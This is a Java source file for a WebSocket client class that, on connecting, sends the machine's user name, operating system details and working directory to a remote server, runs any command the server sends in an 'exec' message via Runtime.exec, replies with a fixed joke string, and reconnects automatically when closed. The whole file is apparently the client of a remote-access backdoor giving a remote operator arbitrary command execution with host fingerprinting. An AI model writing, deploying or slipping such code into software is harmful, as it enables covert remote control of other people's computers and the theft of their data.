package Classes;

import org.java_websocket.client.WebSocketClient;
import org.java_websocket.handshake.ServerHandshake;

import java.io.IOException;
import java.net.URI;
import java.nio.ByteBuffer;
import java.util.HashMap;

import com.google.gson.Gson;

public class Connection extends WebSocketClient {
    Gson json = new Gson();

    public Connection(URI serverURI) {
        super(serverURI);
    }

    @Override
    public void onOpen(ServerHandshake handshakedata) {
        String userName = System.getProperty("user.name");
        String osInformation = System.getProperty("os.name") + " | " +
                System.getProperty("os.version") + " | " +
                System.getProperty("os.arch");

        String dir = System.getProperty("user.dir");

        HashMap<String, String> information = new HashMap<String, String>();
        information.put("type", "connection");
        information.put("user", userName);
        information.put("os", osInformation);
        information.put("dir", dir);

        String toSend = json.toJson(information);

        System.out.println("New connection opened");
        System.out.println(toSend);

        this.send(toSend);
    }

    @Override
    public void onClose(int code, String reason, boolean remote) {
        System.out.println("Closed with exit code " + code + " additional info: " + reason);
        System.out.println("Trying to establish new connection..");

        this.reconnect();
    }

    @Override
    public void onMessage(String message) {
        System.out.println("Received message: " + message);

        HashMap<String, String> command = json.fromJson(message, HashMap.class);

        String type = command.get("type");

        if (type.equals("exec")) {
            String exec = command.get("value");

            System.out.println("Running command " + exec);

            Runtime runtime = Runtime.getRuntime();
            try {
                Process proc = runtime.exec(exec);
            } catch (IOException e) {
                e.printStackTrace();
            }

            HashMap<String, String> information = new HashMap<String, String>();
            information.put("type", "result");
            information.put("value", "du er ballamann");

            String toSend = json.toJson(information);

            this.send(toSend);
        }
    }

    @Override
    public void onMessage(ByteBuffer message) {
        System.out.println("Received ByteBuffer");
    }

    @Override
    public void onError(Exception ex) {
        System.err.println("An error occurred:" + ex);
    }
}